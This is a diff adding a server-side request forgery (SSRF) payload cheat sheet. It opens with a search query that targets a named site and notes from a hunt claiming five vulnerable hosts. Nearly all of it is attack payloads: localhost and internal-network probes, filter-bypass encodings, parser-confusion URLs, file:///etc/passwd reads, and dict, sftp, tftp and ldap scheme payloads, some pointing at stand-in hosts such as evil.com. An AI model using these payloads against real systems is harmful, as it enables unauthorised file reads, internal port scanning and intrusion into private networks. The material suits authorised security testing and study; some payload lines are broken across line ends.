@@ -1,0 +1,179 @@
+Ssrf 
+=====
+
+
+inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:& site:connectie.nl image.php/?
+
+
+- Just extract endpoints from waymore
+- See endpoint called Imageurl=
+- Test Burp collab url (You can see response in burp because it's Image content type)
+- Than advance exploit
+- Found 5 Hosts vulnerable with same endpoint
+file:////etc/passwd
+
+
+Basic SSRF v1
+
+http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:22
+http://0.0.0.0:80
+http://0.0.0.0:443
+http://0.0.0.0:22
+
+Basic SSRF — Alternative version
+
+http://localhost:80
+http://localhost:443
+http://localhost:22
+
+Advanced exploit using a redirection
+
+1. Create a subdomain pointing to 192.168.0.1 with DNS A record  e.g:http://ssrf.example.com
+2. Launch the SSRF: http://vulnerable.com/index.php?url=http://YOUR_SERVER_IP
+http://vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
+
+Advanced exploit using type=url
+
+Change "type=file" to "type=url"
+Paste URL in text field and hit enter
+Using this vulnerability users can upload images from any image URL = trigger an SSRF
+
+Bypassing filters
+Bypass using HTTPS
+
+https://127.0.0.1/
+https://localhost/
+
+Bypass localhost with [::]
+
+http://[::]:80/
+http://[::]:25/ SMTP
+http://[::]:22/ SSH
+http://[::]:3128/ Squidhttp://0000::1:80/
+http://0000::1:25/ SMTP
+http://0000::1:22/ SSH
+http://0000::1:3128/ Squid
+
+Bypass localhost with a domain redirection
+
+http://spoofed.burpcollaborator.net
+http://localtest.me
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io
+http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
+http://bugbounty.dod.network redirect to 127.0.0.2 == localhost
+
+The service http://nip.io is awesome for that, it will convert any ip address as a dns.
+
+http://NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even http://127.0.0.1.nip.io maps to 127.0.0.1
+
+Bypass localhost with CIDR
+
+It’s a /8
+
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+
+Bypass using a decimal IP location
+
+http://0177.0.0.1/
+http://2130706433/ = http://127.0.0.1
+http://3232235521/ = http://192.168.0.1
+http://3232235777/ = http://192.168.1.1
+
+Bypass using IPv6/IPv4 Address Embedding
+
+IPv6/IPv4 Address Embedding
+
+http://[0:0:0:0:0:ffff:127.0.0.1]
+
+Bypass using malformed urls
+
+localhost:+11211aaa
+localhost:00011211aaaa
+
+Bypass using rare address
+
+You can short-hand IP addresses by dropping the zeros
+
+http://0/
+http://127.1
+http://127.0.1
+
+Bypass using bash variables
+
+(curl only)
+
+curl -v "http://evil$google.com"
+$google = ""
+
+Bypass using tricks combination
+
+http://1.1.1.1 &@2.2.2.2# @3
+.3.3.3/
+urllib2 : 1.1.1.1
+requests + browsers : 2.2.2.2
+urllib : 3.3.3.3
+
+Bypass filter_var() php function
+
+0://evil.com:80;http://google.com
+
+Bypass against a weak parser
+
+by Orange Tsai (Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
+
+http://127.1.1.1:80\@127
+.2.2.2:80/
+http://127.1.1.1:80\@@127
+.2.2.2:80/
+http://127.1.1.1:80:\@@127
+.2.2.2:80/
+http://127.1.1.1:80#\@127
+.2.2.2:80/
+
+SSRF exploitation via URL Scheme
+File
+
+Allows an attacker to fetch the content of a file on the server
+
+file://path/to/file
+file:///etc/passwd
+file://\/\/etc/passwd
+ssrf.php?url=file:///etc/passwd
+
+HTTP
+
+Allows an attacker to fetch any content from the web, it can also be used to scan ports.
+
+ssrf.php?url=http://127.0.0.1:22
+ssrf.php?url=http://127.0.0.1:80
+ssrf.php?url=http://127.0.0.1:443
+
+The following URL scheme can be used to probe the network
+Dict
+
+The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
+
+dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
+ssrf.php?url=dict://attacker:11111/
+
+SFTP
+
+A network protocol used for secure file transfer over secure shell
+
+ssrf.php?url=sftp://evil.com:11111/
+
+TFTP
+
+Trivial File Transfer Protocol, works over UDP
+
+ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
+
+LDAP
+
+Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.
+
+ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
